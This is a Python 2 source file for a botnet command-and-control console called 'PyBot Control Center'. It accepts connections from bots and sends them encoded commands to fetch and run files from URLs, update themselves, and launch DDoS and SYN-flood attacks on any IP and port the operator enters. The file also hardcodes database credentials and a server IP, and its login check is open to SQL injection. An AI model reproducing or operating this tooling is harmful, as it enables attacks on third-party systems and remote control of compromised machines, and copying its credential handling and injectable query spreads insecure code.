# -*- coding: utf-8 -*-
from __future__ import with_statement
import sys
import socket
import string
import os
import io
import time
import random
import urllib2
import re
import WConio
import threading
import sys
import MySQLdb as mdb

WConio.highvideo()

def enc(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])-10+(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;
def dec(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])+10-(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;

#(2,24)
old_setting = WConio.gettextinfo()[4] & 0x00FF
WConio.clrscr()
WConio.textcolor(WConio.LIGHTRED)
WConio.settitle("PyBot Control Center")
WConio.gotoxy(2,2)
print "Welcome to the Pybot Control Center"

global l
global key
key = "this is the best key in the world, you'll never guess it :D 4&#*%:J"
l = []


WConio.cputs( "\n    username: " )
user = raw_input()
WConio.cputs( "    password: " )
gpw = raw_input()
print ""

try:
    conn = mdb.connect('184.168.194.11','goldenboy',
                       'P@ssw0rd','goldenboy')
    cursor = conn.cursor()
    cursor.execute("SELECT Password FROM Users WHERE Username = '" + user + "';")
    data = cursor.fetchone()
    if str(data) != "None":
        if str(data[0]) == gpw:
            print "Authorized - Welcome " + user
            time.sleep(2)
            WConio.gotoxy(0,4)
            for i in range(8):
                WConio.cputs("                                                     ")
            #cursor2 = conn.cursor()
            #cursor2.execute("SELECT IP FROM goldenchild WHERE Username = " + user + ";")
            #data2 = cursor2.fetchone()
        else:
            print "Failed Authorization"
            time.sleep(2)
            sys.exit()
    else:
        print "Failed Authorization"
        time.sleep(2)
        sys.exit()
except mdb.Error, e:
    print "Error %d: %s" % (e.args[0],e.args[1])
    print "MySQL Error - Exiting"
    #time.sleep(4)
    raw_input()
    sys.exit()

class HeartBeat ( threading.Thread ):
    def run ( self ):
        while 1:
            for s in l:
                try:
                    toSend = enc("ping", key)
                    s[0].send(toSend)
                except:
                    l.remove(s)
            time.sleep(2)

class DrawGUI ( threading.Thread ):
    def run ( self ):
        time.sleep(3)
        oldLen = 0
        while 1:
            newLen = len(l)
            WConio.textcolor(WConio.LIGHTCYAN)
            posX = WConio.wherex()
            posY = WConio.wherey()
	    WConio.gotoxy(0,4)
	    if newLen < oldLen:
                for n in range(oldLen+1):
                    WConio.cputs("                                  \n\r")
            else:
                for n in range(len(l)+1):
                    WConio.cputs("                                  \n\r")
            WConio.gotoxy(0,4)
	    for i in range(len(l)):
                try:
                    print str(i) + ': ' + str(l[i][2])
                except:
                    print str(i) + ': ' + str(l[i][1][0])
            if posX > 16:
                WConio.gotoxy(posX,22)
            else:
                WConio.gotoxy(17,22)
            oldLen = len(l)
            time.sleep(3)

class GetConnections ( threading.Thread ):
    def run ( self ):
        tt = DrawGUI()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = ''
	port = 8888
	s.bind((host, port))
	s.listen(5)
	WConio.gotoxy(0,24)
	WConio.textcolor(WConio.YELLOW)
        print "Awaiting Connections"
	WConio.gotoxy(17,22)
	posy = 4
	count = 0
	while 1:
            conn, addr = s.accept()
            WConio.textcolor(WConio.YELLOW)
            c = 0
            for p in l:
                c = c + 1
                if addr[0] == p[1][0]:
                    cmd = enc('clean', key)
                    conn.send(cmd)
                else:
                    l.append([conn, addr])
            if c == 0:
                l.append([conn, addr])
		
t = GetConnections()
t.start()
tt = DrawGUI()
tt.start()
ttt = HeartBeat()
ttt.start()

def Test():
    for s in l:
        cmd = enc('test', key)
        s[0].send(cmd)

def GetInfo():
    for s in l:
        cmd = enc('info', key)
        s[0].send(cmd)
        thing = s[0].recv(10000000)
        try:
            test = str(s[2])
        except:
            s.append(thing)

def Get(url, directory, run):
    for s in l:
        cmd = enc('get ' + url + " " + directory + ' ' + run, key)
        s[0].send(cmd)

def Run(url):
    for s in l:
        cmd = enc('run ' + url, key)
        s[0].send(cmd)

def Update(url, directory):
    for s in l:
        cmd = enc('update ' + url + " " + directory, key)
        s[0].send(cmd)

def DDOS(ip, port, num):
    for s in l:
        cmd = enc('ddos ' + ip + " " + port + ' ' + num, key)
        s[0].send(cmd)
        
def SYNFlood(ip, port, num):
    for s in l:
        cmd = enc('synflood ' + ip + " " + port + ' ' + num, key)
        s[0].send(cmd)

def Clean(num):
    if num == 'all':
        for s in l:
            cmd = enc('clean', key)
            s[0].send(cmd)
    else:
        num = int(num)
        cmd = enc('clean', key)
        l[num][0].send(cmd)

while 1:
    WConio.gotoxy(2,22)
    WConio.cputs("                                               ")
    WConio.gotoxy(2,22)
    WConio.textcolor(WConio.LIGHTBLUE)
    print "Enter command: "
    WConio.gotoxy(17, 22)
    WConio.textcolor(WConio.LIGHTCYAN)
    WConio.gotoxy(17, 22)
    cmd = raw_input()
    WConio.gotoxy(17, 22)
    cmd = cmd.split(" ")
    WConio.gotoxy(17, 22)
    accepted = False
           
    if cmd[0] == 'Test' or cmd[0] == 'test' or cmd[0] == 'TEST':
        Test()
        accepted = True
    elif cmd[0] == 'ddos' or cmd[0] == 'DDOS' or cmd[0] == 'dos' or cmd[0] == "DOS":
        DDOS(cmd[1], cmd[2], cmd[3])
        accepted = True
    elif cmd[0] == 'synflood' or cmd[0] == 'syn':
        SYNFlood(cmd[1], cmd[2], cmd[3])
        accepted = True
    elif cmd[0] == 'get' or cmd[0] == 'wget':
        Get(cmd[1], cmd[2], cmd[3])
        accepted = True
    elif cmd[0] == 'run' or cmd[0] == 'Run' or cmd[0] == 'RUN':
        Run(cmd[1])
        accepted = True
    elif cmd[0] == 'update' or cmd[0] == 'Update':
        Update(cmd[1], cmd[2])
        accepted = True
    elif cmd[0] == 'terminate' or cmd[0] == 'stop' or cmd[0] == 'clean' or cmd[0] == "vaccinate":
        accepted = True
        Clean(cmd[1])
    elif cmd[0] == 'info' or cmd[0] == 'Info':
        GetInfo()
        accepted = True
    elif cmd[0] == 'exit' or cmd[0] == 'Exit' or cmd[0] == 'close' or cmd[0] == 'Close' or cmd[0] == 'Quit' or cmd[0] == 'quit':
        WConio.gotoxy(0,24)
        WConio.cputs("                                                        ")
        WConio.gotoxy(0,24)
        print "Click the X button, this function isn't working."
        count = 4
        for i in range(4):
            WConio.gotoxy(i+76, count)
            count = count - 1
            print "/"
    else:
        WConio.gotoxy(0,24)
        WConio.cputs("                                                        ")
        WConio.gotoxy(0,24)
        print "Command not recognized."
        
    if accepted:
        WConio.gotoxy(0,24)
        WConio.cputs("                                                        ")
        WConio.gotoxy(0,24)
        print "'", cmd[0], "' command accepted."
